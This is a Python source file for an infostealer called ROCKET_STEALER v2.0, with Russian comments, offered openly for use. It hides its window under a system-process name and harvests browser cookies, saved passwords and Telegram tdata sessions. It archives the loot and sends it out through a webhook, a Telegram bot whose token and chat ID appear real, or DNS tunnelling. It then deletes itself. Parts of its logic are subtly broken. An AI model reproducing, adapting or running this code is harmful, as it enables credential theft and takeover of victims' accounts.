#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ROCKET_STEALER v2.0 (20.05.2026)
# Расширенный стиллер: tdata + Cookies + Passwords

import os
import sys
import shutil
import subprocess
import zipfile
import time
import json
import hashlib
import base64
import socket
import threading
import platform
import requests
import sqlite3
import win32crypt
import re
from datetime import datetime, timedelta
from pathlib import Path
import ctypes

# ======================== КОНФИГУРАЦИЯ ========================
CONFIG = {
    "webhook_url": "https://your-server.com/upload",
    "bot_token": "8988457819:AAHhgjhLE5xVHcxNq0qADsy9v_lAFAmSumo",
    "chat_id": "8422461912",
    "password": "rocket_2026",
    "temp_dir": os.path.join(os.environ.get("TEMP", "/tmp"), ".system_cache"),
    "self_destruct": True,
    "use_dns_exfil": False,
    "dns_server": "your-dns-server.com",
    "browsers": [
        "Chrome", "Edge", "Opera", "Brave", "Vivaldi", 
        "Firefox", "Opera GX", "Chromium", "Yandex", "Safari"
    ],
    "steal_cookies": True,
    "steal_passwords": True,
    "steal_history": False,
    "steal_bookmarks": False
}

# ======================== МАСКИРОВКА ПРОЦЕССА ========================
def hide_process():
    """Скрывает окно и маскирует процесс"""
    if platform.system() == "Windows":
        ctypes.windll.kernel32.SetConsoleTitleW("System Service")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        try:
            # Маскировка под системный процесс
            import win32process
            import win32api
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        except:
            pass

# ======================== ПОИСК TDATA ========================
def find_tdata():
    """Поиск папки tdata Telegram"""
    system = platform.system()
    candidates = []

    if system == "Windows":
        base = os.environ.get("APPDATA", "")
        candidates.extend([
            os.path.join(base, "Telegram Desktop", "tdata"),
            os.path.join(base, "Telegram", "tdata"),
            os.path.expandvars(r"%LOCALAPPDATA%\Telegram Desktop\tdata"),
            os.path.expandvars(r"%PROGRAMFILES%\Telegram Desktop\tdata"),
            os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Roaming", "Telegram Desktop", "tdata"),
            os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Telegram Desktop", "tdata")
        ])
    elif system == "Darwin":
        home = os.path.expanduser("~")
        candidates.extend([
            os.path.join(home, "Library", "Application Support", "Telegram Desktop", "tdata"),
            os.path.join(home, "Library", "Containers", "org.telegram.desktop", "Data", "Library", "Application Support", "Telegram Desktop", "tdata")
        ])
    elif system == "Linux":
        home = os.path.expanduser("~")
        candidates.extend([
            os.path.join(home, ".local", "share", "TelegramDesktop", "tdata"),
            os.path.join(home, ".telegram", "tdata"),
            "/var/lib/telegram/tdata"
        ])

    for path in candidates:
        if os.path.exists(path) and os.path.isdir(path):
            try:
                if any(f in os.listdir(path) for f in ["D877F783D5D3EF8C", "key_datas", "usertag"]):
                    return path
            except:
                continue
    return None

# ======================== СТИЛЛЕР COOKIES ========================
def get_browser_paths():
    """Возвращает пути к профилям браузеров"""
    browser_paths = {}
    appdata_local = os.environ.get("LOCALAPPDATA", "")
    appdata_roaming = os.environ.get("APPDATA", "")
    
    # Пути для Windows
    if platform.system() == "Windows":
        browser_paths = {
            "Chrome": os.path.join(appdata_local, "Google", "Chrome", "User Data"),
            "Edge": os.path.join(appdata_local, "Microsoft", "Edge", "User Data"),
            "Opera": os.path.join(appdata_roaming, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable"),
            "Brave": os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data"),
            "Vivaldi": os.path.join(appdata_local, "Vivaldi", "User Data"),
            "Chromium": os.path.join(appdata_local, "Chromium", "User Data"),
            "Yandex": os.path.join(appdata_local, "Yandex", "YandexBrowser", "User Data"),
            "Firefox": os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles")
        }
    elif platform.system() == "Darwin":
        home = os.path.expanduser("~")
        browser_paths = {
            "Chrome": os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
            "Edge": os.path.join(home, "Library", "Application Support", "Microsoft Edge"),
            "Firefox": os.path.join(home, "Library", "Application Support", "Firefox", "Profiles"),
            "Safari": os.path.join(home, "Library", "Safari")
        }
    elif platform.system() == "Linux":
        home = os.path.expanduser("~")
        browser_paths = {
            "Chrome": os.path.join(home, ".config", "google-chrome"),
            "Edge": os.path.join(home, ".config", "microsoft-edge"),
            "Firefox": os.path.join(home, ".mozilla", "firefox"),
            "Chromium": os.path.join(home, ".config", "chromium"),
            "Brave": os.path.join(home, ".config", "BraveSoftware", "Brave-Browser")
        }
    
    return browser_paths

def extract_cookies_chrome(browser_path, profile="Default"):
    """Извлекает cookies из Chromium-браузеров"""
    cookies_data = []
    cookie_db_path = os.path.join(browser_path, profile, "Cookies")
    
    if not os.path.exists(cookie_db_path):
        return cookies_data
    
    # Копируем БД, чтобы не блокировать браузер
    temp_db = os.path.join(CONFIG["temp_dir"], "cookies_temp.db")
    shutil.copy2(cookie_db_path, temp_db)
    
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure FROM cookies")
        
        for row in cursor.fetchall():
            cookie = {
                "host": row[0],
                "name": row[1],
                "value": row[2] if not row[2].startswith("v10") else decrypt_chrome(row[2]),
                "path": row[3],
                "expires": row[4],
                "secure": row[5]
            }
            cookies_data.append(cookie)
        
        conn.close()
    except:
        pass
    
    os.remove(temp_db)
    return cookies_data

def decrypt_chrome(encrypted_value):
    """Расшифровывает зашифрованные cookie (Windows)"""
    try:
        if platform.system() == "Windows":
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_value)[1].decode()
    except:
        pass
    return encrypted_value

def extract_cookies_firefox(profiles_path):
    """Извлекает cookies из Firefox"""
    cookies_data = []
    
    if not os.path.exists(profiles_path):
        return cookies_data
    
    for profile in os.listdir(profiles_path):
        profile_path = os.path.join(profiles_path, profile)
        cookie_db = os.path.join(profile_path, "cookies.sqlite")
        
        if not os.path.exists(cookie_db):
            continue
        
        temp_db = os.path.join(CONFIG["temp_dir"], f"ff_cookies_{profile}.db")
        shutil.copy2(cookie_db, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
            
            for row in cursor.fetchall():
                cookie = {
                    "host": row[0],
                    "name": row[1],
                    "value": row[2],
                    "path": row[3],
                    "expires": row[4],
                    "secure": row[5]
                }
                cookies_data.append(cookie)
            
            conn.close()
        except:
            pass
        
        os.remove(temp_db)
    
    return cookies_data

def extract_cookies_safari(path):
    """Извлекает cookies из Safari (macOS)"""
    cookies_data = []
    
    if not os.path.exists(path):
        return cookies_data
    
    cookie_db = os.path.join(path, "Cookies.binarycookies")
    if not os.path.exists(cookie_db):
        return cookies_data
    
    # Простое копирование, так как бинарный формат сложный
    try:
        temp_file = os.path.join(CONFIG["temp_dir"], "safari_cookies.binary")
        shutil.copy2(cookie_db, temp_file)
        # Отправляем как есть, парсить бинарник сложно без спец. библиотек
        cookies_data.append({"type": "safari_binary", "file": temp_file})
    except:
        pass
    
    return cookies_data

def steal_all_cookies():
    """Главная функция сбора всех cookies"""
    all_cookies = {}
    browser_paths = get_browser_paths()
    
    for browser, path in browser_paths.items():
        if not os.path.exists(path):
            continue
        
        if browser == "Firefox":
            cookies = extract_cookies_firefox(path)
        elif browser == "Safari":
            cookies = extract_cookies_safari(path)
        else:
            # Chromium-based browsers
            cookies = []
            # Проверяем профили
            for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
                profile_path = os.path.join(path, profile)
                if os.path.exists(profile_path):
                    cookies.extend(extract_cookies_chrome(path, profile))
            
            # Если ничего не найдено, пытаемся найти все папки профилей
            if not cookies:
                for item in os.listdir(path):
                    if item.startswith("Profile") or item == "Default":
                        profile_path = os.path.join(path, item)
                        if os.path.isdir(profile_path):
                            cookies.extend(extract_cookies_chrome(path, item))
        
        if cookies:
            all_cookies[browser] = cookies
    
    return all_cookies

# ======================== СТИЛЛЕР ПАРОЛЕЙ ========================
def extract_passwords_chrome(browser_path, profile="Default"):
    """Извлекает сохранённые пароли из Chromium-браузеров"""
    passwords = []
    login_db_path = os.path.join(browser_path, profile, "Login Data")
    
    if not os.path.exists(login_db_path):
        return passwords
    
    temp_db = os.path.join(CONFIG["temp_dir"], "passwords_temp.db")
    shutil.copy2(login_db_path, temp_db)
    
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            password = {
                "url": row[0],
                "username": row[1],
                "password": decrypt_chrome(row[2]) if row[2] else ""
            }
            if password["password"]:
                passwords.append(password)
        
        conn.close()
    except:
        pass
    
    os.remove(temp_db)
    return passwords

def extract_passwords_firefox(profiles_path):
    """Извлекает пароли из Firefox"""
    passwords = []
    
    if not os.path.exists(profiles_path):
        return passwords
    
    for profile in os.listdir(profiles_path):
        profile_path = os.path.join(profiles_path, profile)
        logins_db = os.path.join(profile_path, "logins.json")
        
        if not os.path.exists(logins_db):
            continue
        
        try:
            with open(logins_db, 'r', encoding='utf-8') as f:
                data = json.load(f)
                for login in data.get("logins", []):
                    password = {
                        "url": login.get("hostname", ""),
                        "username": login.get("encryptedUsername", ""),
                        "password": login.get("encryptedPassword", "")
                    }
                    passwords.append(password)
        except:
            pass
    
    return passwords

def steal_all_passwords():
    """Главная функция сбора всех паролей"""
    all_passwords = {}
    browser_paths = get_browser_paths()
    
    for browser, path in browser_paths.items():
        if not os.path.exists(path):
            continue
        
        if browser == "Firefox":
            passwords = extract_passwords_firefox(path)
        else:
            passwords = []
            for item in os.listdir(path):
                if item.startswith("Profile") or item == "Default":
                    profile_path = os.path.join(path, item)
                    if os.path.isdir(profile_path):
                        passwords.extend(extract_passwords_chrome(path, item))
        
        if passwords:
            all_passwords[browser] = passwords
    
    return all_passwords

# ======================== СБОР ИНФОРМАЦИИ О СИСТЕМЕ ========================
def get_system_info():
    """Собирает информацию о системе"""
    info = {
        "device": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "release": platform.release(),
        "processor": platform.processor(),
        "architecture": platform.architecture()[0],
        "time": datetime.now().isoformat(),
        "username": os.environ.get("USERNAME", os.environ.get("USER", "")),
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname())
    }
    return info

# ======================== ФОРМИРОВАНИЕ ОТЧЕТА ========================
def generate_report(cookies_data, passwords_data, system_info):
    """Создаёт JSON-отчёт со всеми данными"""
    report = {
        "system": system_info,
        "cookies": cookies_data,
        "passwords": passwords_data,
        "timestamp": datetime.now().isoformat()
    }
    
    report_path = os.path.join(CONFIG["temp_dir"], "steal_report.json")
    with open(report_path, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    return report_path

# ======================== АРХИВАЦИЯ ВСЕХ ДАННЫХ ========================
def archive_all_data(tdata_path, report_path):
    """Архивирует все украденные данные"""
    if not tdata_path and not report_path:
        return None
    
    os.makedirs(CONFIG["temp_dir"], exist_ok=True)
    timestamp = int(time.time())
    zip_name = f"data_{timestamp}.zip"
    zip_path = os.path.join(CONFIG["temp_dir"], zip_name)
    
    temp_dir = os.path.join(CONFIG["temp_dir"], "data_collection")
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)
    
    # Копируем tdata
    if tdata_path and os.path.exists(tdata_path):
        tdata_dest = os.path.join(temp_dir, "telegram_tdata")
        shutil.copytree(tdata_path, tdata_dest, symlinks=False, ignore_dangling_symlinks=True)
    
    # Копируем отчёт
    if report_path and os.path.exists(report_path):
        shutil.copy2(report_path, os.path.join(temp_dir, "report.json"))
    
    # Копируем все временные файлы (cookies, пароли)
    for file in os.listdir(CONFIG["temp_dir"]):
        if file.endswith(".db") or file.endswith(".binary") or file.endswith(".json"):
            if file != "report.json":
                shutil.copy2(os.path.join(CONFIG["temp_dir"], file), temp_dir)
    
    # Создаём архив
    if shutil.which("7z"):
        subprocess.run(
            f"7z a -tzip -p{CONFIG['password']} -mhe=on {zip_path} {temp_dir} -r",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    else:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    full = os.path.join(root, file)
                    arcname = os.path.relpath(full, temp_dir)
                    zf.write(full, arcname)
        with open(zip_path, 'ab') as f:
            f.write(b"//DATA_STEALER v2.0\n")
    
    # Очистка
    shutil.rmtree(temp_dir)
    return zip_path

# ======================== ЭКСФИЛЬТРАЦИЯ ========================
def exfiltrate_file(file_path):
    """Отправка данных на сервер"""
    if not file_path or not os.path.exists(file_path):
        return False

    success = False

    # HTTP
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            data = {'device': platform.node(), 'os': platform.system(), 'time': datetime.now().isoformat()}
            r = requests.post(CONFIG["webhook_url"], files=files, data=data, timeout=15)
            if r.status_code in (200, 201):
                success = True
    except:
        pass

    # Telegram
    if CONFIG["bot_token"] != "ВАШ_ТОКЕН" and not success:
        try:
            url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': CONFIG['chat_id'], 'caption': f'📊 Данные с {platform.node()}\nOS: {platform.system()}'}
                r = requests.post(url, files=files, data=data, timeout=15)
                if r.status_code == 200:
                    success = True
        except:
            pass

    # DNS
    if CONFIG["use_dns_exfil"] and not success:
        try:
            with open(file_path, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            chunk_size = 200
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i+chunk_size]
                domain = f"{chunk}.{CONFIG['dns_server']}"
                socket.gethostbyname(domain)
                time.sleep(0.1)
            socket.gethostbyname(f"END.{CONFIG['dns_server']}")
            success = True
        except:
            pass

    return success

# ======================== САМОУНИЧТОЖЕНИЕ ========================
def self_destruct(file_path, script_path):
    """Удаление следов"""
    if CONFIG["self_destruct"]:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
            if os.path.exists(script_path):
                os.remove(script_path)
            if os.path.exists(CONFIG["temp_dir"]):
                shutil.rmtree(CONFIG["temp_dir"], ignore_errors=True)
        except:
            pass

# ======================== ОСНОВНАЯ ФУНКЦИЯ ========================
def main():
    hide_process()
    
    # Создаём временную папку
    if not os.path.exists(CONFIG["temp_dir"]):
        os.makedirs(CONFIG["temp_dir"], exist_ok=True)
    
    # Сбор информации о системе
    system_info = get_system_info()
    
    # Сбор cookies и паролей
    cookies = {}
    passwords = {}
    
    if CONFIG["steal_cookies"]:
        cookies = steal_all_cookies()
    
    if CONFIG["steal_passwords"]:
        passwords = steal_all_passwords()
    
    # Создание отчёта
    report_path = generate_report(cookies, passwords, system_info)
    
    # Поиск tdata
    tdata_path = find_tdata()
    
    # Создание архива
    zip_file = archive_all_data(tdata_path, report_path)
    
    if zip_file:
        exfiltrate_file(zip_file)
        self_destruct(zip_file, __file__)
    
    sys.exit(0)

# ======================== ЗАПУСК ========================
if __name__ == "__main__":
    # Запуск в отдельном потоке
    t = threading.Thread(target=main)
    t.daemon = True
    t.start()
    time.sleep(2)
    sys.exit(0)